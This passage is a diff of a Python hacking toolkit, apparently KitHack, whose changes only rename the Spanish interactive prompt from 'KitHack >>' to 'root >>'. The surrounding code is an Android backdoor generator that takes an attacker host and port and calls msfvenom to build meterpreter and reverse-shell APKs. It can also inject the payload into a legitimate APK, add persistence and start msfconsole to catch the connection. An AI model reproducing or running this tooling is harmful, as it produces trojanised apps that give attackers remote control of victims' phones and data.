 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -1966,14 +1967,14 @@ def main():
 				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
 				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
 				
-				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				a = input("{0}root >> {1}".format(RED, DEFAULT))
 				a = a.zfill(2)
 				
 				if a == '01':
 					run_network()
 					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
 						break
 					else:
 						Tk().withdraw()
@@ -1981,7 +1982,7 @@ def main():
 						print("\n{0}ICON: {1}".format(YELLOW, icon))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))	
 						file = open("/tmp/data.txt", "w")
 						file.write(icon + '\n')
 						file.write(mainout)
@@ -2016,7 +2017,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2041,7 +2042,7 @@ def main():
 					# Salida de bucle
 					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
 					mainout = os.path.splitext(OUT)[0]
-					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
 					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
@@ -2055,7 +2056,7 @@ def main():
 							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 							break						
 						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 							os.system('systemctl stop postgresql && clear')
 							main()	
 						else:
@@ -2081,7 +2082,7 @@ def main():
 					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
 					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))
 
-					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					m = input("{0}root >> {1}".format(RED, DEFAULT))
 					m = m.zfill(2)
 
 					if m == '01':					
@@ -2093,7 +2094,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
@@ -2107,7 +2108,7 @@ def main():
 								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 								break							
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2137,7 +2138,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
@@ -2171,7 +2172,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2212,14 +2213,14 @@ def main():
 				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
 				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
 				
-				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				a = input("{0}root >> {1}".format(RED, DEFAULT))
 				a = a.zfill(2)
 				
 				if a == '01':
 					run_network()
 					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
 						break
 					else:
 						Tk().withdraw()
@@ -2227,7 +2228,7 @@ def main():
 						print("\n{0}ICON: {1}".format(YELLOW, icon))						
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))	
 						file = open("/tmp/data.txt", "w")
 						file.write(icon + '\n')
 						file.write(mainout)
@@ -2262,7 +2263,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2287,7 +2288,7 @@ def main():
 					# Salida de bucle
 					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
 					mainout = os.path.splitext(OUT)[0]
-					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
 					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
@@ -2301,7 +2302,7 @@ def main():
 							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 							break						
 						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 							os.system('systemctl stop postgresql && clear')
 							main()	
 						else:
@@ -2327,7 +2328,7 @@ def main():
 					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
 					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))
 
-					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					m = input("{0}root >> {1}".format(RED, DEFAULT))
 					m = m.zfill(2)
 					
 					if m == '01':
@@ -2339,7 +2340,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
@@ -2353,7 +2354,7 @@ def main():
 								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 								break							
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2383,7 +2384,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
@@ -2417,7 +2418,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2458,14 +2459,14 @@ def main():
 				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
 				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
 				
-				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				a = input("{0}root >> {1}".format(RED, DEFAULT))
 				a = a.zfill(2)
 				
 				if a == '01':
 					run_network()
 					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
 						break
 					else:
 						Tk().withdraw()
@@ -2473,7 +2474,7 @@ def main():
 						print("\n{0}ICON: {1}".format(YELLOW, icon))						
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
 						mainout = os.path.splitext(OUT)[0]	
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						file = open("/tmp/data.txt", "w")
 						file.write(icon + '\n')
 						file.write(mainout)
@@ -2508,7 +2509,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2533,7 +2534,7 @@ def main():
 					# Salida de bucle
 					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
 					mainout = os.path.splitext(OUT)[0]
-					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
 					os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
@@ -2547,7 +2548,7 @@ def main():
 							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 							break						
 						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 							os.system('systemctl stop postgresql && clear')
 							main()	
 						else:
@@ -2573,7 +2574,7 @@ def main():
 					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
 					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))
 
-					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					m = input("{0}root >> {1}".format(RED, DEFAULT))
 					m = m.zfill(2)
 					
 					if m == '01':
@@ -2585,7 +2586,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
@@ -2599,7 +2600,7 @@ def main():
 								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 								break							
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2629,7 +2630,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
@@ -2663,7 +2664,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2704,14 +2705,14 @@ def main():
 				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
 				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
 				
-				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				a = input("{0}root >> {1}".format(RED, DEFAULT))
 				a = a.zfill(2)
 				
 				if a == '01':
 					run_network()
 					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
 						break
 					else:
 						Tk().withdraw()
@@ -2719,7 +2720,7 @@ def main():
 						print("\n{0}ICON: {1}".format(YELLOW, icon))						
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))	
 						file = open("/tmp/data.txt", "w")
 						file.write(icon + '\n')
 						file.write(mainout)
@@ -2754,7 +2755,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2779,7 +2780,7 @@ def main():
 					# Salida de bucle
 					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 					mainout = os.path.splitext(OUT)[0]
-					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
 					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
@@ -2793,7 +2794,7 @@ def main():
 							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 							break						
 						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 							os.system('systemctl stop postgresql && clear')
 							main()	
 						else:
@@ -2819,7 +2820,7 @@ def main():
 					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
 					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))
 
-					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					m = input("{0}root >> {1}".format(RED, DEFAULT))
 					m = m.zfill(2)
 
 					if m == '01':
@@ -2831,7 +2832,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
@@ -2845,7 +2846,7 @@ def main():
 								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 								break							
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -2875,7 +2876,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
@@ -2909,7 +2910,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()								
 							else:
@@ -2950,14 +2951,14 @@ def main():
 				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
 				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
 				
-				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				a = input("{0}root >> {1}".format(RED, DEFAULT))
 				a = a.zfill(2)
 
 				if a == '01':
 					run_network()
 					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
 						break
 					else:
 						Tk().withdraw()
@@ -2965,7 +2966,7 @@ def main():
 						print("\n{0}ICON: {1}".format(YELLOW, icon))						
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 						mainout = os.path.splitext(OUT)[0]	
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						file = open("/tmp/data.txt", "w")
 						file.write(icon + '\n')
 						file.write(mainout)
@@ -3000,7 +3001,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -3025,7 +3026,7 @@ def main():
 					# Salida de bucle					
 					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 					mainout = os.path.splitext(OUT)[0]
-					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
